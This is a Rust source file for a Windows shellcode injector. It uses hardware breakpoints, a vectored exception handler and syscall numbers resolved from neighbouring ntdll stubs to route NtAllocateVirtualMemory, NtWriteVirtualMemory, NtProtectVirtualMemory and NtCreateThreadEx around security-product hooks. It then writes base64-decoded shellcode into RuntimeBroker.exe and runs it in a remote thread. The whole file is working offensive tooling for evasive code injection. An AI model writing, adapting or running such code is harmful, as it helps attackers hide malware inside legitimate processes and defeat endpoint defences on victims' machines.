#![allow(non_snake_case)]
#![allow(non_camel_case_types)]

use std::ffi::c_void;
use std::mem::size_of;
use std::ptr::null_mut;
use std::sync::Mutex;
use lazy_static::lazy_static;
use base64::{Engine as _, engine::general_purpose};
use windows::core::PCSTR;
use windows::Win32::Foundation::{HANDLE, HINSTANCE, NTSTATUS, CloseHandle};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
use windows::Win32::System::Threading::{
    GetCurrentThread, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD,
};
use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameA};

#[repr(C, align(16))]
pub struct CONTEXT {
    pub P1Home: u64,
    pub P2Home: u64,
    pub P3Home: u64,
    pub P4Home: u64,
    pub P5Home: u64,
    pub P6Home: u64,
    pub ContextFlags: u32,
    pub MxCsr: u32,
    pub SegCs: u16,
    pub SegDs: u16,
    pub SegEs: u16,
    pub SegFs: u16,
    pub SegGs: u16,
    pub SegSs: u16,
    pub EFlags: u32,
    pub Dr0: u64,
    pub Dr1: u64,
    pub Dr2: u64,
    pub Dr3: u64,
    pub Dr6: u64,
    pub Dr7: u64,
    pub Rax: u64,
    pub Rcx: u64,
    pub Rdx: u64,
    pub Rbx: u64,
    pub Rsp: u64,
    pub Rbp: u64,
    pub Rsi: u64,
    pub Rdi: u64,
    pub R8: u64,
    pub R9: u64,
    pub R10: u64,
    pub R11: u64,
    pub R12: u64,
    pub R13: u64,
    pub R14: u64,
    pub R15: u64,
    pub Rip: u64,
}

#[repr(C)]
pub struct EXCEPTION_RECORD {
    pub ExceptionCode: NTSTATUS,
    pub ExceptionFlags: u32,
    pub ExceptionRecord: *mut EXCEPTION_RECORD,
    pub ExceptionAddress: *mut c_void,
    pub NumberParameters: u32,
    pub ExceptionInformation: [usize; 15],
}

#[repr(C)]
pub struct EXCEPTION_POINTERS {
    pub ExceptionRecord: *mut EXCEPTION_RECORD,
    pub ContextRecord: *mut CONTEXT,
}

const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100000 | 0x00000010;

extern "system" {
    fn AddVectoredExceptionHandler(FirstHandler: u32, VectoredHandler: Option<unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32>) -> *mut c_void;
    fn GetThreadContext(hThread: HANDLE, lpContext: *mut CONTEXT) -> i32;
    fn SetThreadContext(hThread: HANDLE, lpContext: *const CONTEXT) -> i32;
}

type NtAllocateVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> NTSTATUS;

type NtWriteVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut c_void,
    Buffer: *const c_void,
    BufferSize: usize,
    NumberOfBytesWritten: *mut usize,
) -> NTSTATUS;

type NtProtectVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    NewProtect: u32,
    OldProtect: *mut u32,
) -> NTSTATUS;

type NtCreateThreadEx = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    ProcessHandle: HANDLE,
    StartRoutine: *mut c_void,
    Argument: *mut c_void,
    CreateFlags: u32,
    ZeroBits: usize,
    StackSize: usize,
    MaximumStackSize: usize,
    AttributeList: *mut c_void,
) -> NTSTATUS;

lazy_static! {
    static ref SYSCALL_MAP: Mutex<std::collections::HashMap<usize, u32>> = Mutex::new(std::collections::HashMap::new());
    static ref SYSCALL_RET_ADDR: Mutex<usize> = Mutex::new(0);
}

unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    if (*record).ExceptionCode.0 as u32 == EXCEPTION_SINGLE_STEP {
        if let Ok(map) = SYSCALL_MAP.lock() {
            if let Some(&ssn) = map.get(&((*context).Rip as usize)) {
                (*context).Rax = ssn as u64;
                (*context).R10 = (*context).Rcx;
                if let Ok(ret_addr) = SYSCALL_RET_ADDR.lock() {
                    (*context).Rip = *ret_addr as u64;
                }
                (*context).Dr6 = 0;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }
    EXCEPTION_CONTINUE_SEARCH
}

fn find_syscall_ret() -> Option<usize> {
    unsafe {
        let ntdll = GetModuleHandleA(PCSTR("ntdll.dll\0".as_ptr())).ok()?;
        let nt_test_alert = GetProcAddress(ntdll, PCSTR("NtTestAlert\0".as_ptr()))?;
        let mut ptr = nt_test_alert as *const u8;

        for _ in 0..500 {
            if *ptr == 0x0f && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xc3 {
                return Some(ptr as usize);
            }
            ptr = ptr.add(1);
        }
    }
    None
}

fn get_ssn(function_name: &str) -> Option<(usize, u32)> {
    unsafe {
        let ntdll = GetModuleHandleA(PCSTR("ntdll.dll\0".as_ptr())).ok()?;
        let func_addr = GetProcAddress(ntdll, PCSTR(format!("{}\0", function_name).as_ptr()))?;
        let func_ptr = func_addr as *const u8;

        if *func_ptr == 0x4c && *func_ptr.add(1) == 0x8b && *func_ptr.add(2) == 0xd1 && *func_ptr.add(3) == 0xb8 {
            let ssn = *(func_ptr.add(4) as *const u32);
            return Some((func_ptr as usize, ssn));
        }

        for i in 1..500 {
            let up_ptr = func_ptr.offset(i * 32);
            if *up_ptr == 0x4c && *up_ptr.add(1) == 0x8b && *up_ptr.add(2) == 0xd1 && *up_ptr.add(3) == 0xb8 {
                let ssn = *(up_ptr.add(4) as *const u32) - i as u32;
                return Some((func_ptr as usize, ssn));
            }
            let down_ptr = func_ptr.offset(-(i * 32));
            if *down_ptr == 0x4c && *down_ptr.add(1) == 0x8b && *down_ptr.add(2) == 0xd1 && *down_ptr.add(3) == 0xb8 {
                let ssn = *(down_ptr.add(4) as *const u32) + i as u32;
                return Some((func_ptr as usize, ssn));
            }
        }
    }
    None
}

unsafe fn set_hwbp(address: usize, index: usize) -> Result<(), String> {
    let mut context: CONTEXT = std::mem::zeroed();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    let thread = GetCurrentThread();
    if GetThreadContext(thread, &mut context) == 0 {
        return Err("Failed to get thread context".to_string());
    }

    match index {
        0 => context.Dr0 = address as u64,
        1 => context.Dr1 = address as u64,
        2 => context.Dr2 = address as u64,
        3 => context.Dr3 = address as u64,
        _ => return Err("Invalid HWBP index".to_string()),
    }

    context.Dr7 |= 1 << (index * 2);
    context.Dr7 &= !(0xF << (16 + index * 4));

    if SetThreadContext(thread, &context) == 0 {
        return Err("Failed to set thread context".to_string());
    }
    Ok(())
}

fn get_process_id_by_name(target_name: &str) -> Option<u32> {
    let mut processes = [0u32; 1024];
    let mut cb_needed = 0u32;

    unsafe {
        if EnumProcesses(processes.as_mut_ptr(), size_of::<[u32; 1024]>() as u32, &mut cb_needed).is_err() {
            return None;
        }

        let count = cb_needed / size_of::<u32>() as u32;
        for i in 0..count {
            let pid = processes[i as usize];
            if pid == 0 { continue; }

            let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
            if let Ok(h) = handle {
                let mut name = [0u8; 260];
                let len = GetModuleBaseNameA(h, HINSTANCE(0), &mut name);
                if len > 0 {
                    let name_str = std::str::from_utf8(&name[..len as usize]).unwrap_or("");
                    if name_str.to_lowercase() == target_name.to_lowercase() {
                        let _ = CloseHandle(h);
                        return Some(pid);
                    }
                }
                let _ = CloseHandle(h);
            }
        }
    }
    None
}

fn main() {
    let shellcode_b64 = "yc8AAAAAQAAAAP9BvAIAAABYAAAAYAAAAIAAAAD0AAAAVAAAAGAAAACAAAAAyAAAAOQAAAD4AAAAAAAAAAsAAAAUAACAAAAAgAAAAMAAAADUAAAA6AAAAAAAAACAAAAA4AAAAPAAAAD4AAAABAEAAAgBAAAMAQAADgEAAA4BAAAPAQAAKAEAAAgBAAA";
    let shellcode = match general_purpose::STANDARD.decode(shellcode_b64) {
        Ok(s) => s,
        Err(_) => {
            eprintln!("Failed to decode shellcode.");
            return;
        }
    };

    unsafe {
        AddVectoredExceptionHandler(1, Some(veh_handler));
        if let Some(addr) = find_syscall_ret() {
            if let Ok(mut ret_addr) = SYSCALL_RET_ADDR.lock() {
                *ret_addr = addr;
            }
        } else {
            eprintln!("Failed to find syscall gadget.");
            return;
        }
    }

    let functions = vec![
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
    ];

    let mut function_addresses = std::collections::HashMap::new();

    for (i, func) in functions.iter().enumerate() {
        if let Some((addr, ssn)) = get_ssn(func) {
            if let Ok(mut map) = SYSCALL_MAP.lock() {
                map.insert(addr, ssn);
            }
            function_addresses.insert(func.to_string(), addr);
            unsafe {
                if let Err(e) = set_hwbp(addr, i) {
                    eprintln!("Error setting HWBP for {}: {}", func, e);
                }
            }
            println!("{}: 0x{:04x} HWBP at 0x{:x}", func, ssn, addr);
        }
    }

    if let Some(pid) = get_process_id_by_name("RuntimeBroker.exe") {
        println!("Found RuntimeBroker.exe with PID: {}", pid);
        unsafe {
            let h_process = match OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid) {
                Ok(h) => h,
                Err(_) => {
                    eprintln!("Failed to open process.");
                    return;
                }
            };

            let nt_allocate_virtual_memory: NtAllocateVirtualMemory = std::mem::transmute(*function_addresses.get("NtAllocateVirtualMemory").unwrap());
            let nt_write_virtual_memory: NtWriteVirtualMemory = std::mem::transmute(*function_addresses.get("NtWriteVirtualMemory").unwrap());
            let nt_protect_virtual_memory: NtProtectVirtualMemory = std::mem::transmute(*function_addresses.get("NtProtectVirtualMemory").unwrap());
            let nt_create_thread_ex: NtCreateThreadEx = std::mem::transmute(*function_addresses.get("NtCreateThreadEx").unwrap());

            let mut base_address: *mut c_void = null_mut();
            let mut region_size = shellcode.len();

            println!("Allocating memory...");
            let status = nt_allocate_virtual_memory(
                h_process,
                &mut base_address,
                0,
                &mut region_size,
                (MEM_COMMIT.0 | MEM_RESERVE.0) as u32,
                PAGE_READWRITE.0,
            );

            if status.0 != 0 {
                eprintln!("NtAllocateVirtualMemory failed: 0x{:x}", status.0);
                let _ = CloseHandle(h_process);
                return;
            }

            println!("Writing shellcode...");
            let mut bytes_written = 0;
            let status = nt_write_virtual_memory(
                h_process,
                base_address,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
                &mut bytes_written,
            );

            println!("Changing protection...");
            let mut old_protect = 0;
            let status = nt_protect_virtual_memory(
                h_process,
                &mut base_address,
                &mut region_size,
                PAGE_EXECUTE_READ.0,
                &mut old_protect,
            );

            println!("Creating remote thread...");
            let mut h_thread = HANDLE(0);
            let status = nt_create_thread_ex(
                &mut h_thread,
                0x1FFFFF, // THREAD_ALL_ACCESS
                null_mut(),
                h_process,
                base_address,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            println!("NtCreateThreadEx status: 0x{:x}", status.0);

            let _ = CloseHandle(h_process);
        }
    } else {
        println!("RuntimeBroker.exe not found.");
    }
}
